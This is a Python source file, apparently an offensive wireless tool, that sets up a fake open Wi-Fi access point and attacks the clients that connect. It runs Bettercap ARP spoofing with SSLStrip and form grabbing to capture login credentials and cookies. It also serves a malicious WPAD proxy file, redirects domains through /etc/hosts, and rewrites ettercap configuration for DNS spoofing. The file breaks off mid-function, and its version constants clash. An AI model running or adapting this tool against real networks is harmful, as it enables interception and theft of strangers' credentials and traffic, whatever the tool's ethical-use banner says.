#!/usr/bin/env python3
import os
import subprocess
import requests
import re
import time
import threading
import ipaddress
import sys
import shutil
import threading
import signal
import atexit
from typing import List, Optional

# ANSI color codes
RED     = "\033[91m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
BLUE    = "\033[94m"
MAGENTA = "\033[95m"
CYAN    = "\033[96m"
RESET   = "\033[0m"


def check_root():
    """Verifies if the script is running as root."""
    if os.geteuid() != 0:
        print(RED + "[-] This script must be run with root privileges. Please run it with sudo or as root." + RESET)
        sys.exit(1)



def accept_code_of_conduct():
    """Displays a disclaimer and code of conduct, and requires the user's acceptance once per version."""
    CURRENT_VERSION = "v0.3"
    script_dir = os.path.dirname(os.path.abspath(__file__))
    agreement_file = os.path.join(script_dir, ".fapa_agreement")

    # Check if agreement file exists and matches current version
    if os.path.exists(agreement_file):
        with open(agreement_file, "r") as f:
            agreed_version = f.read().strip()
        if agreed_version == CURRENT_VERSION:
            return  # Already accepted for this version

    # Display agreement
    conduct_text = f"""
====================================================================
        Code of Conduct and Disclaimer - Version {CURRENT_VERSION}
====================================================================
This tool is provided solely for research and ethical testing purposes.

You agree to use this tool responsibly and only in authorized environments.
The use of this tool on networks or systems without explicit permission is illegal and may result in criminal penalties.

The developer is not responsible for any damage, loss or legal consequences resulting from the improper use of this tool.

By continuing, you confirm that:
   - You are authorized to perform tests in the environment where this tool is used.
   - You will use this tool only for ethical research purposes.

Type "I agree" to accept and continue: """
    
    response = input(YELLOW + conduct_text + RESET)
    if response.strip().lower() != "i agree":
        print(RED + "[-] Code of conduct not accepted. Exiting..." + RESET)
        sys.exit(1)

    # Save version agreement locally
    with open(agreement_file, "w") as f:
        f.write(CURRENT_VERSION)



def check_for_updates():
    # URL where the updated version is hosted (in a file "VERSION" in the GitHub repository)
    VERSION_URL = "https://raw.githubusercontent.com/LvL23HT/FAPA/main/VERSION"
    
    print(GREEN + "[+] Checking for updates..." + RESET)
    try:
        response = requests.get(VERSION_URL, timeout=5)
        response.raise_for_status()  # Raise an error if the response is not 200
        remote_version = response.text.strip()
        
        # Compare versions (a simple string comparison here)
        if remote_version > CURRENT_VERSION:
            print(GREEN + f"[+] New version detected: {remote_version}. Your current version is {CURRENT_VERSION}." + RESET)
            option = input(YELLOW + "Do you want to update to the latest version? (y/n): " + RESET).strip().lower()
            if option == "y" or option == "s":  # "y" for English, "s" for Spanish users switching to English
                update_script()
            else:
                print(CYAN + "[*] Update cancelled by the user." + RESET)
        else:
            print(GREEN + "[+] You are running the latest version." + RESET)
    except Exception as e:
        print(RED + "[-] Could not check for updates:" + str(e) + RESET)


def update_script():
    # URL the script updated
    SCRIPT_URL = "https://raw.githubusercontent.com/LvL23HT/FAPA/main/FAPA.py"
    try:
        response = requests.get(SCRIPT_URL, timeout=5)
        response.raise_for_status()
        print(GREEN + "[+] Updating the script from the repository..." + RESET)
        with open(__file__, "wb") as file:
            file.write(response.content)
        print(GREEN + "[+] Update complete. Restarting the script..." + RESET)
        os.execv(sys.executable, [sys.executable] + sys.argv)
    except Exception as e:
        print(RED + "[-] Error updating the script:", e + RESET)


# Call the checking functions before continuing with the rest of the script.
check_root()
accept_code_of_conduct()

# Global variable for the current script version
CURRENT_VERSION = "v0.2"

# Global variables for notifications
notifications_thread = None
notifications_stop_event = None

# Global variables for the fake AP
ap_interface_global = None
fake_ap_ssid_global = None  # Global variable for the Fake AP ESSID


def create_virtual_environment():
    # Check if the script is already running inside a virtual environment.
    if sys.prefix == sys.base_prefix:
        print(GREEN + "[+] No virtual environment detected. Creating 'venv'..." + RESET)
        # Create the virtual environment if it doesn't exist.
        if not os.path.exists("venv"):
            subprocess.run([sys.executable, "-m", "venv", "--system-site-packages", "venv"], check=True)
        else:
            print(GREEN + "[+] The virtual environment 'venv' already exists." + RESET)
        # Restart the script using the virtual environment interpreter.
        venv_python = os.path.join("venv", "bin", "python")
        print(GREEN + "[+] Restarting the script in the virtual environment..." + RESET)
        os.execv(venv_python, [venv_python] + sys.argv)
    else:
        print(GREEN + "[+] Virtual environment active." + RESET)


def install_dependencies():
    print(GREEN + "[+] Updating package list..." + RESET)
    subprocess.run(["sudo", "apt", "update"], check=False)
    
    packages = {
        "aircrack-ng": "aircrack-ng",
        "hostapd": "hostapd",
        "dnsmasq": "dnsmasq",
        "bettercap": "bettercap",
        "wifiphisher": "wifiphisher",
        "tcpdump": "tcpdump",
        "gnome-terminal": "gnome-terminal",
        "scapy": "scapy",
        "apache2": "apache2",  # Para WPAD spoofing
        "golang-go": "golang-go",  # Para Evilginx2
        "git": "git"  # Para Evilginx2
    }
    
    for key, package in packages.items():
        result = subprocess.run(["dpkg", "-s", package], capture_output=True, text=True)
        if result.returncode != 0:
            print(GREEN + f"[+] Installing {package}..." + RESET)
            install = subprocess.run(["sudo", "apt", "install", "-y", package], capture_output=True, text=True)
            if install.returncode != 0:
                print(RED + f"[-] Error installing {package}:" + RESET)
                print(RED + install.stderr + RESET)
                
    # Python dependencies
    print(GREEN + "[+] Upgrading Python dependencies..." + RESET)
    subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip", "requests", "scapy"], check=False)
    
    # Install Evilginx2 if not installed
    install_evilginx2()


def run_command(command):
    subprocess.run(command, shell=True, check=False)


def list_interfaces():
    result = subprocess.run(["iw", "dev"], capture_output=True, text=True)
    interfaces = []
    for line in result.stdout.split('\n'):
        if "Interface" in line:
            interfaces.append(line.split()[1])
    return interfaces


def select_interface():
    interfaces = list_interfaces()
    if not interfaces:
        print(RED + "[-] No wireless network interfaces found." + RESET)
        return None
    print(GREEN + "[+] Available wireless interfaces:" + RESET)
    for idx, iface in enumerate(interfaces):
        print(CYAN + f"[{idx + 1}] {iface}" + RESET)
    selection = input(YELLOW + "Select the interface to use (physical interface, not monitor): " + RESET)
    try:
        return interfaces[int(selection) - 1]
    except (IndexError, ValueError):
        print(RED + "[-] Invalid selection." + RESET)
        return None


def get_interface_ip(interface):
    try:
        result = subprocess.run(["ip", "addr", "show", interface], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet ") and "inet6" not in line:
                # Extract the IP address (without the mask)
                ip = line.split()[1].split("/")[0]
                return ip
        return None
    except Exception as e:
        print(RED + "Error obtaining the interface IP:" + str(e) + RESET)
        return None


def select_wired_interface():
    print(GREEN + "[+] Listing available wired interfaces..." + RESET)
    try:
        result = subprocess.run("nmcli device status", shell=True, capture_output=True, text=True)
        lines = result.stdout.splitlines()
        ethernet_interfaces = []
        for line in lines[1:]:
            parts = line.split()
            if len(parts) >= 4 and parts[1].lower() == "ethernet":
                ethernet_interfaces.append(parts[0])
        if not ethernet_interfaces:
            print(RED + "[-] No wired interfaces found." + RESET)
            return None
        print(GREEN + "[+] Available wired interfaces:" + RESET)
        for idx, iface in enumerate(ethernet_interfaces):
            print(CYAN + f"[{idx + 1}] {iface}" + RESET)
        selection = input(YELLOW + "Select the wired (output) interface: " + RESET)
        return ethernet_interfaces[int(selection) - 1]
    except Exception as e:
        print(RED + "Error listing wired interfaces:" + str(e) + RESET)
        return None


def reset_interface(interface):
    print(GREEN + f"[+] Resetting interface {interface} and terminating conflicting processes..." + RESET)
    run_command("sudo systemctl stop wpa_supplicant")
    run_command("sudo systemctl stop hostapd")
    run_command("sudo systemctl stop dnsmasq")
    run_command("sudo killall -9 wpa_supplicant hostapd dnsmasq")
    run_command(f"sudo ip link set {interface} down")
    run_command("sudo rfkill unblock all")


def enable_ap_mode(interface):
    print(GREEN + f"[+] Configuring {interface} in AP mode..." + RESET)
    run_command(f"sudo ip link set {interface} down")
    run_command(f"sudo iw dev {interface} set type __ap")
    run_command(f"sudo ip link set {interface} up")
    return interface


def configure_dnsmasq(interface, dhcp_range, lease_time):
    dnsmasq_config = f"""
interface={interface}
dhcp-range={dhcp_range},{lease_time}
dhcp-option=option:router,192.168.1.1
dhcp-option=option:dns-server,8.8.8.8,8.8.4.4
log-queries
log-dhcp
"""
    with open("/etc/dnsmasq.conf", "w") as file:
        file.write(dnsmasq_config)
    run_command("sudo systemctl restart dnsmasq")


def configure_network(interface):
    run_command(f"sudo ip link set {interface} down")
    run_command(f"sudo ip addr flush dev {interface}")
    run_command(f"sudo ip addr add 192.168.1.1/24 dev {interface}")
    run_command(f"sudo ip link set {interface} up")


def start_hostapd():
    print(GREEN + "[+] Unmasking hostapd..." + RESET)
    run_command("sudo systemctl unmask hostapd")
    print(GREEN + "[+] Starting hostapd..." + RESET)
    run_command("sudo systemctl restart hostapd")


def enable_nat():
    print(GREEN + "[+] Enabling NAT to provide Internet access to connected clients..." + RESET)
    run_command("sudo sysctl -w net.ipv4.ip_forward=1")
    external_interface = select_wired_interface()
    if not external_interface:
        print(RED + "[-] No wired interface was selected. NAT will not be configured." + RESET)
    else:
        run_command("sudo iptables -t nat -F")
        run_command(f"sudo iptables -t nat -A POSTROUTING -o {external_interface} -j MASQUERADE")
        print(GREEN + f"[+] NAT enabled using interface {external_interface}." + RESET)


def setup_fake_ap():
    global ap_interface_global, fake_ap_ssid_global
    ssid = input(YELLOW + "Enter the Fake AP name: " + RESET) or "Free_WiFi"
    fake_ap_ssid_global = ssid
    channel = input(YELLOW + "Enter the channel (default 6): " + RESET) or "6"
    interface = select_interface()
    if not interface:
        return
    reset_interface(interface)
    run_command(f"sudo nmcli device set {interface} managed no")
    ap_interface = enable_ap_mode(interface)
    ap_interface_global = ap_interface
    print(GREEN + f"[+] Setting up Fake Access Point on {ap_interface}..." + RESET)
    hostapd_config_path = "/etc/hostapd/hostapd.conf"
    with open(hostapd_config_path, "w") as f:
        f.write(f"""
interface={ap_interface}
driver=nl80211
ctrl_interface=/var/run/hostapd
ssid={ssid}
hw_mode=g
country_code=US
ieee80211d=1
ieee80211n=1
ignore_broadcast_ssid=0
channel={channel}
auth_algs=1
wpa=0
""".strip())
    configure_dnsmasq(ap_interface, "192.168.1.50,192.168.1.150", "12h")
    configure_network(ap_interface)
    start_hostapd()
    enable_nat()


def recover_interface(interface):
    print(GREEN + f"[+] Recovering interface {interface} back to Managed mode..." + RESET)
    run_command(f"sudo nmcli device set {interface} managed yes")
    run_command(f"sudo ip link set {interface} down")
    run_command(f"sudo iw dev {interface} set type managed")
    run_command(f"sudo ip link set {interface} up")
    print(GREEN + "[+] Interface recovered to Managed mode." + RESET)


def get_dhcp_leases():
    leases = {}
    try:
        with open("/var/lib/misc/dnsmasq.leases", "r") as f:
            for line in f:
                parts = line.strip().split()
                if len(parts) >= 3:
                    timestamp, mac, ip = parts[0], parts[1], parts[2]
                    hostname = parts[3] if len(parts) >= 4 else ""
                    leases[mac.lower()] = {"IP": ip, "hostname": hostname}
    except Exception as e:
        print(RED + "Error reading dnsmasq leases:" + str(e) + RESET)
    return leases


def network_configuration_menu():
    while True:
        print(BLUE + """
[NETWORK CONFIGURATION]
  1) Configure Fake AP (Custom)
  2) Automate Configuration (Default)
  3) Back to Main Menu
""" + RESET)
        option = input(YELLOW + "Select an option: " + RESET).strip()
        if option == "1":
            setup_fake_ap()
        elif option == "2":
            automate_network_configuration()
        elif option == "3":
            break
        else:
            print(RED + "[-] Invalid option, please try again.\n" + RESET)


def get_connected_stations():
    try:
        output = subprocess.check_output("sudo hostapd_cli all_sta", shell=True, text=True)
    except Exception as e:
        print(RED + "Error executing hostapd_cli:" + str(e) + RESET)
        return []
    stations = []
    current_station = None
    for line in output.splitlines():
        line = line.strip()
        if line.startswith("Selected interface"):
            continue
        if re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", line):
            if current_station is not None:
                stations.append(current_station)
            current_station = {"MAC": line}
        elif "=" in line and current_station is not None:
            key, value = line.split("=", 1)
            current_station[key.strip()] = value.strip()
    if current_station is not None:
        stations.append(current_station)
    leases = get_dhcp_leases()
    for station in stations:
        mac = station.get("MAC", "").lower()
        if mac in leases:
            station.update(leases[mac])
    return stations


def monitor_clients():
    print(GREEN + "Monitoring connected clients (hostapd). Press ENTER to stop." + RESET)
    stop_event = threading.Event()
    previous_stations = []

    def monitor():
        nonlocal previous_stations
        while not stop_event.is_set():
            current_stations = get_connected_stations()
            if current_stations != previous_stations:
                os.system("clear")
                print(MAGENTA + "----- Connected Clients (hostapd) -----" + RESET)
                if current_stations:
                    for station in current_stations:
                        mac = station.get("MAC", "N/A")
                        ip = station.get("IP", "N/A")
                        hostname = station.get("hostname", "N/A")
                        print(CYAN + f"MAC: {mac} | IP: {ip} | Hostname: {hostname}" + RESET)
                else:
                    print(RED + "No clients connected." + RESET)
                previous_stations = current_stations
            time.sleep(5)
    t = threading.Thread(target=monitor, daemon=True)
    t.start()
    input(YELLOW + "Press ENTER to stop monitoring..." + RESET)
    stop_event.set()
    t.join(timeout=1)
    print(GREEN + "Monitoring stopped." + RESET)
    
def get_connected_clients():
    """Returns list of connected clients with their IPs"""
    clients = []
    leases = get_dhcp_leases()
    stations = get_connected_stations()
    
    for station in stations:
        mac = station.get("MAC", "").lower()
        if mac in leases:
            clients.append({
                "MAC": mac,
                "IP": leases[mac]["IP"],
                "hostname": leases[mac]["hostname"]
            })
    return clients

def show_connected_clients():
    """Displays connected clients in a legible manner"""
    clients = get_connected_clients()
    if not clients:
        print(RED + "[-] No connected clients found." + RESET)
        return None
    
    print(GREEN + "[+] Connected clients:" + RESET)
    for i, client in enumerate(clients, 1):
        print(CYAN + f"  [{i}] IP: {client['IP']} | MAC: {client['MAC']} | Hostname: {client['hostname']}" + RESET)
    return clients    


def start_mitm_attack():
    target = select_target()
    if not target:
        print(RED + "[-] Could not select a target." + RESET)
        return
    target_ip = target.get("IP")
    if not target_ip:
        print(RED + "[-] No IP found for the selected target." + RESET)
        return
    iface = input(YELLOW + "Enter the interface for the MITM attack (leave blank to use the AP interface): " + RESET).strip()
    if iface == "" and ap_interface_global is not None:
        iface = ap_interface_global
    if not iface:
        print(RED + "[-] No interface selected for MITM." + RESET)
        return
    print(GREEN + f"Starting MITM attack on interface {iface} against target {target_ip} using Bettercap..." + RESET)
    log_path = "/home/kali/Desktop/bettercap_log.txt"
    print(CYAN + "A new terminal window will open with Bettercap in interactive mode." + RESET)
    print(CYAN + "Inside that window you can use commands such as:" + RESET)
    print(CYAN + "  - help     : list available commands" + RESET)
    print(CYAN + "  - net.show : show connected devices" + RESET)
    print(CYAN + "  - arp.show : show the ARP table" + RESET)
    print(CYAN + "  - exit     : exit Bettercap" + RESET)
    print(CYAN + "When finished, close the window or press ENTER here to return to the main menu." + RESET)
    try:
        cmd = (
            f"gnome-terminal -- bash -c 'cd /home/kali/Desktop; sudo bettercap -iface {iface} "
            f"-eval \"set log.output.file {log_path}; set arp.spoof.targets {target_ip}; set arp.spoof.fullduplex true; arp.spoof on; "
            f"net.probe on; net.recon on; set net.sniff.filter \\\"tcp port 80\\\"; set net.sniff.verbose true; "
            f"set net.sniff.output /home/kali/Desktop/bettercap_capture.pcap; net.sniff on; "
            f"set http.proxy.sslstrip true; set http.proxy.parse_post true; http.proxy on; "
            f"events.stream off; events.stream on\"; exec bash'"
        )
        proc = subprocess.Popen(cmd, shell=True)
        input(YELLOW + "Press ENTER to return to the main menu..." + RESET)
        proc.terminate()
        proc.wait(timeout=5)
        print(GREEN + "MITM attack stopped. Check the log at:" + RESET, log_path)
    except Exception as e:
        print(RED + "Error starting Bettercap in a new terminal window:" + str(e) + RESET)
        

class MITMAttacker:
    def __init__(self, interface: str = None):
        self.interface = interface or ap_interface_global
        self.background_processes = []
        self.modified_files = {}
        self.is_running = False
        
        # Register cleanup on normal program exit
        atexit.register(self.cleanup)

    def _run_command(self, command: str, background: bool = False) -> Optional[subprocess.Popen]:
        """Run shell commands with background option and process tracking."""
        try:
            if background:
                process = subprocess.Popen(command, shell=True, preexec_fn=os.setsid)
                self.background_processes.append(process)
                return process
            return subprocess.run(command, shell=True, check=True)
        except subprocess.CalledProcessError as e:
            print(RED + f"[-] Command failed: {e}" + RESET)
            return None

    def cleanup(self):
        """Revert all changes and stop running processes."""
        print(YELLOW + "[!] Cleaning up..." + RESET)
        
        # Stop all background processes
        self.stop_all_processes()
        
        # Restore modified files
        self._restore_modified_files()
        
        # Stop Apache if we started it
        if hasattr(self, '_apache_started_by_us'):
            self._run_command("sudo systemctl stop apache2")
            print(GREEN + "[+] Apache service stopped" + RESET)
        
        print(GREEN + "[+] Cleanup complete" + RESET)

    def _restore_modified_files(self):
        """Restore any files we modified during attacks."""
        for original, backup in self.modified_files.items():
            try:
                self._run_command(f"sudo cp {backup} {original}")
                print(GREEN + f"[+] Restored original {original}" + RESET)
            except Exception as e:
                print(RED + f"[-] Failed to restore {original}: {e}" + RESET)

    def stop_all_processes(self):
        """Stop all background processes we started."""
        for process in self.background_processes:
            try:
                os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                process.wait(timeout=5)
                print(GREEN + f"[+] Stopped process {process.pid}" + RESET)
            except (ProcessLookupError, subprocess.TimeoutExpired) as e:
                print(RED + f"[-] Failed to stop process {process.pid}: {e}" + RESET)
        self.background_processes = []

    def start_sslstrip_plus(self, target_ip: str):
        """Run Bettercap with SSLStrip+ in a new terminal without blocking the main terminal."""
        if not self.interface:
            print(RED + "[-] No interface configured." + RESET)
            return

        print(GREEN + f"[+] Starting SSLStrip+ on the interface {self.interface}..." + RESET)
        print(CYAN + """
[HELP]:
- Bettercap will run with:
* SSLStrip+ enabled
* ARP spoofing to the target
""" + RESET)

        # Command to run Bettercap in a new terminal without blocking the main terminal
        cmd = (
            f"gnome-terminal -- bash -c 'sudo bettercap -iface {self.interface} "
            f"-eval \"set http.proxy.sslstrip true; "
            f"set arp.spoof.targets {target_ip}; "
            f"arp.spoof on; http.proxy on; "
            f"set events.stream.output ~/bettercap_sslstrip.log; "
            f"events.stream on\"; exec bash'"
        )

        try:
            # Open a new terminal and run the command without blocking the main terminal
            subprocess.Popen(cmd, shell=True)
            print(CYAN + "[*] SSLStrip+ started in a new terminal." + RESET)
        except Exception as e:
            print(RED + "[-] Error starting SSLStrip+ in a new terminal:", str(e) + RESET)

        self.is_running = True
        
    def form_grabbing_submenu(self):
        """Muestra el submenú para Form Grabbing"""
        while True:
            print(BLUE + """
[Form Grabbing Submenu]
  1) Start Form Grabbing
  2) View captured credentials
  3) Back to Main Menu
""" + RESET)

            option = input(YELLOW + "Select an option: " + RESET).strip()

            if option == "1":
                self.start_form_grabbing()
            elif option == "2":
                self.view_captured_credentials()
            elif option == "3":
                break  # Vuelve al menú principal
            else:
                print(RED + "[-] Invalid option, please try again." + RESET)


    def start_form_grabbing(self, output_file: str = "creds.txt"):
        """Captura credenciales con manejo de archivo de salida"""
        output_path = os.path.expanduser(f"~/{output_file}")
        self._run_command(f"touch {output_path}")
        self._run_command(f"chmod 666 {output_path}")
        print(GREEN + f"[+] Getting started Form Grabbing, the results will be saved in {output_path}" + RESET)
        print(CYAN + """
[HELP]:
- Bettercap will capture:
* HTTP/HTTPS credentials from forms
* Authentication cookies
* POST data from login forms
- Results will be saved automatically
""" + RESET)

        # Comando para ejecutar Bettercap en un nuevo terminal para Form Grabbing
        cmd = f"gnome-terminal -- bash -c 'sudo bettercap -iface {self.interface} -eval \"set http.proxy.sslstrip true; http.proxy on; set http.proxy.form.output {output_path}; set http.proxy.form.enable true; events.stream on\"; exec bash'"

        try:
            # Abre un nuevo terminal y ejecuta el comando sin bloquear el principal
            subprocess.Popen(cmd, shell=True)
            print(CYAN + "[*] Form Grabbing started on a new terminal." + RESET)
        except Exception as e:
            print(RED + "[-] Error starting Form Grabbing on a new terminal: ", str(e) + RESET)

        self.is_running = True

    def view_captured_credentials(self, output_file: str = "creds.txt"):
        """Muestra las credenciales capturadas desde el archivo"""
        output_path = os.path.expanduser(f"~/{output_file}")
        if os.path.exists(output_path):
            with open(output_path, "r") as file:
                credentials = file.read()
                print(GREEN + f"[+] Credentials captured from {output_path}:\n" + RESET)
                print(CYAN + credentials + RESET)
        else:
            print(RED + f"[-] The file {output_file} does not exist or is empty." + RESET)


    def setup_wpad_spoofing(self, proxy_ip: str = "192.168.1.1"):
        """Configure WPAD with automatic monitoring and cleanup."""
        # Check if Apache is running
        apache_status = subprocess.run("systemctl is-active apache2", 
                                     shell=True, 
                                     stdout=subprocess.PIPE)
        self._apache_started_by_us = (apache_status.returncode != 0)
        
        if self._apache_started_by_us:
            self._run_command("sudo systemctl start apache2")
        
        # Backup original hosts file if we haven't already
        if "/etc/hosts" not in self.modified_files:
            self.modified_files["/etc/hosts"] = "/etc/hosts.bak"
            self._run_command("sudo cp /etc/hosts /etc/hosts.bak")
            

        print(GREEN + "[+] Configuring WPAD Spoofing..." + RESET)        
        # Configure WPAD
        wpad_content = f"""function FindProxyForURL(url, host) {{
    return "PROXY {proxy_ip}:8080";
}}"""
        
        os.makedirs("/var/www/html", exist_ok=True)
        with open("/var/www/html/wpad.dat", "w") as f:
            f.write(wpad_content)
        print(GREEN + "[+] WPAD file created at /var/www/html/wpad.dat" + RESET)    
        
        print(CYAN + """
[HELP]:
- A malicious wpad.dat file will be created
- Apache will serve the file at http://<your-IP>/wpad.dat
- Access monitor will open in a new terminal
- Clients with automatic proxy enabled will be redirected
- [!] Make sure a proxy is listening on port 8080 (e.g., mitmproxy or bettercap)
""" + RESET)
        
        # Monitor access.log
        monitor_cmd = (
        "gnome-terminal -- bash -c 'sudo tail -f /var/log/apache2/access.log "
        "| grep --color=always \"wpad.dat\\|POST\\|GET\" ; exec bash'")
        self._run_command(monitor_cmd, background=True)

    def bypass_hsts(self, domains: List[str]):
        """HSTS Bypass with proper file restoration."""
        if not domains:
            return
        print(GREEN + "[+] Configurando HSTS Bypass..." + RESET)
        print(CYAN + """
[HELP]:
- /etc/hosts will be modified to redirect domains
- Requires the attacker to have web service on 80/443
- For best effect, combine with:
* SSLStrip+
* Fake web server (e.g., Evilginx2)
""" + RESET)
           
            
        # Backup original hosts file if we haven't already
        if "/etc/hosts" not in self.modified_files:
            self.modified_files["/etc/hosts"] = "/etc/hosts.bak"
            self._run_command("sudo cp /etc/hosts /etc/hosts.bak")
        
        # Add entries
        with open("/etc/hosts", "a") as f:
            f.write("\n# HSTS Bypass\n")
            your_ip = get_interface_ip(self.interface) or "192.168.1.1"
            for domain in domains:
                if domain.strip():
                    f.write(f"{your_ip} {domain.strip()}\n")
                    f.write(f"{your_ip} www.{domain.strip()}\n")
                    
        print(GREEN + f"[+] HSTS bypass configured for: {', '.join(domains)}" + RESET)
        print(YELLOW + "[!] For this to work, you must be running a web server on this machine." + RESET)
        print(GREEN + f"[+] Traffic redirection for HSTS Bypass is active on {self.interface}" + RESET)
        print(GREEN + "[+] Monitoring for requests to the specified domains is now enabled." + RESET)
        print(CYAN + f"[INFO] You can monitor manually in another terminal to watch live traffic:\n    sudo tcpdump -i {self.interface} port 80 or port 443 | grep \"{'|'.join(domains)}\"" + RESET)

                    
        
        # Monitor traffic
        monitor_cmd = (
        f"gnome-terminal -- bash -c 'echo \"HSTS Bypass Traffic Monitor:\"; "
        f"sudo tcpdump -i {self.interface} port 80 or port 443 "
        f"| grep --color=always \"{'\\|'.join(domains)}\" ; exec bash'")
        self._run_command(monitor_cmd, background=True)

        


def select_target():
    stations = get_connected_stations()
    if not stations:
        print(RED + "[-] No connected devices found." + RESET)
        return None
    print(GREEN + "Connected devices:" + RESET)
    for i, station in enumerate(stations):
        ip = station.get("IP", "N/A")
        mac = station.get("MAC", "N/A")
        hostname = station.get("hostname", "N/A")
        print(CYAN + f"[{i + 1}] IP: {ip} | MAC: {mac} | Hostname: {hostname}" + RESET)
    selection = input(YELLOW + "Select the number of the device to attack: " + RESET)
    try:
        index = int(selection) - 1
        if index < 0 or index >= len(stations):
            print(RED + "[-] Invalid selection." + RESET)
            return None
        return stations[index]
    except Exception as e:
        print(RED + "Error selecting target:" + str(e) + RESET)
        return None


def create_dns_spoof_caplet(target_ip):
    # Creates a temporary caplet with the commands for DNS spoofing.
    caplet_path = "/tmp/ettercap_dns.cap"
    content = (
        f'set log.output.file /home/kali/Desktop/ettercap_log.txt;\n'
        f'set arp.spoof.targets "//{target_ip}//";\n'
        'set arp.spoof.fullduplex true;\n'
        'arp.spoof on;\n'
        'net.probe on;\n'
        'net.recon on;\n'
        'set net.sniff.filter "tcp port 80";\n'
        'set net.sniff.verbose true;\n'
        'set http.proxy.sslstrip true;\n'
        'set http.proxy.parse_post true;\n'
        'http.proxy on;\n'
    )
    try:
        with open(caplet_path, "w") as f:
            f.write(content)
        print(GREEN + f"[+] DNS Spoofing caplet created at: {caplet_path}" + RESET)
    except Exception as e:
        print(RED + "Error creating the caplet:" + str(e) + RESET)
    return caplet_path


def get_default_gateway():
    try:
        output = subprocess.check_output("ip route | grep default", shell=True, text=True)
        parts = output.split()
        if len(parts) >= 3:
            return parts[2]
        else:
            return None
    except Exception as e:
        print(RED + "Error obtaining the gateway IP:" + str(e) + RESET)
        return None


import re
import subprocess

def configure_ettercap_conf():
    config_path = "/etc/ettercap/etter.conf"
    backup_path = "/etc/ettercap/etter.conf.bak"
    
    try:
        # Create a backup
        subprocess.run(f"sudo cp {config_path} {backup_path}", shell=True, check=True)
        print(GREEN + "[+] Backup of etter.conf created at:" + RESET, backup_path)
        
        # Read the original file
        with open(config_path, "r") as f:
            lines = f.readlines()
        
        new_lines = []
        for line in lines:
            stripped = line.lstrip()
            # Do not modify commented lines
            if stripped.startswith("#"):
                new_lines.append(line)
            elif stripped.startswith("redir_command_on"):
                new_lines.append('redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-ports 8080";\n')
            elif stripped.startswith("redir_command_off"):
                new_lines.append('redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-ports 8080";\n')
            elif stripped.startswith("ec_uid"):
                # Replace the number (e.g., 65534) with 0, preserving the comment
                new_line = re.sub(r'^(ec_uid\s*=\s*)\d+', r'\1 0', line)
                new_lines.append(new_line)
            elif stripped.startswith("ec_gid"):
                new_line = re.sub(r'^(ec_gid\s*=\s*)\d+', r'\1 0', line)
                new_lines.append(new_line)
            else:
                new_lines.append(line)
        
        # Write to a temporary file and then move it
        with open("/tmp/etter.conf", "w") as f:
            f.writelines(new_lines)
        
        subprocess.run(f"sudo mv /tmp/etter.conf {config_path}", shell=True, check=True)
        print(GREEN + "[+] etter.conf updated successfully." + RESET)
    except Exception as e:
        print(RED + "Error updating etter.conf:" + str(e) + RESET)


def set_iptables_legacy():
    try:
        subprocess.run("sudo update-alternatives --set iptables /usr/sbin/iptables-legacy", shell=True, check=True)
        subprocess.run("sudo update-alternatives --set ip6tables /usr/sbin/ip6tables-legacy", shell=True, check=True)
        # Flush nftables rules (if any)
        subprocess.run("sudo nft flush ruleset", shell=True, check=True)
        print(GREEN + "[+] Iptables set to legacy and nftables flushed." + RESET)
    except Exception as e:
        print(RED + "Error configuring iptables to legacy:" + str(e) + RESET)


def restore_iptables_nft():
    try:
        subprocess.run("sudo update-alternatives --set iptables /usr/sbin/iptables-nft", shell=True, check=True)
        subprocess.run("sudo update-alternatives --set ip6tables /usr/sbin/ip6tables-nft", shell=True, check=True)
        # Optionally restart nftables service if needed
        subprocess.run("sudo systemctl restart nftables", shell=True, check=True)
        print(GREEN + "[+] Iptables restored to nft." + RESET)
    except Exception as e:
        print(RED + "Error restoring iptables to nft:" + str(e) + RESET)


def configure_etter_dns(domain, destination_ip):
    dns_file = "/etc/ettercap/etter.dns"
    backup_file = "/etc/ettercap/etter.dns.bak"
    try:
        # Create a backup
        subprocess.run(f"sudo cp {dns_file} {backup_file}", shell=True, check=True)
        print(GREEN + "[+] Backup of etter.dns created at:" + RESET, backup_file)
        
        # Read the file line by line
        with open(dns_file, "r") as f:
            lines = f.readlines()
        
        new_rule = f"{domain} A {destination_ip}\n"
        rule_exists = False
        new_lines = []
        for line in lines:
            # Check if the line (trimmed) starts exactly with the domain followed by a space
            if line.lstrip().startswith(domain + " "):
                new_lines.append(new_rule)
                rule_exists = True
            else:
                new_lines.append(line)
        
        # If no rule exists, add it at the end
        if not rule_exists:
            new_lines.append(new_rule)
        
        # Write the updated content to a temporary file and move it to the original file
        with open("/tmp/etter.dns", "w") as f:
            f.writelines(new_lines)
        subprocess.run(f"sudo mv /tmp/etter.dns {dns_file}", shell=True, check=True)
        print(GREEN + f"[+] Rule for {domain} updated successfully in etter.dns." + RESET)
    except Exception as e:
        print(RED + "Error updating etter.dns:" + str(e) + RESET)


def request_redirections():
    """
    Prompts the user for multiple redirections and validates them.
    Returns a list of tuples (domain, destination_ip).
    """
    redirections = []
    while True:
        domain = input(YELLOW + "Enter the domain to redirect (or leave blank to finish): " + RESET).strip()
        if domain == "":
            break
        # Validate the domain format (accepts both "google.com" and "*.google.com")
        if not re.match(r'^(?:\*\.)?[\w.-]+\.[a-zA-Z]{2,}$', domain):
            print(RED + "[-] The entered domain format is not correct." + RESET)
            continue

        destination_ip = input(YELLOW + f"Enter the destination IP for {domain} (e.g., 87.240.183.90): " + RESET).strip()
        # Validate that the IP address is correct
        try:
            ipaddress.ip_address(destination_ip)
        except ValueError:
            print(RED + "[-] The entered IP is not valid." + RESET)
            continue

        redirections.append((domain, destination_ip))
    return redirections


def start_dns_spoof_attack():
    iface = input(YELLOW + "Enter the interface for the DNS Spoofing attack (leave blank to use the AP interface): " + RESET).strip()
    if iface == "" and ap_interface_global is not None:
        iface = ap_interface_global
    if not iface:
        print(RED + "[-] No interface selected for DNS Spoofing." + RESET)
        return

    target = select_target()
    if not target:
        print(RED + "[-] No target found for DNS Spoofing." + RESET)
        return
    target_ip = target.get("IP")
    if not target_ip:
        print(RED + "[-] No IP found for the target." + RESET)
        return

    gateway_ip = get_default_gateway()
    if not gateway_ip:
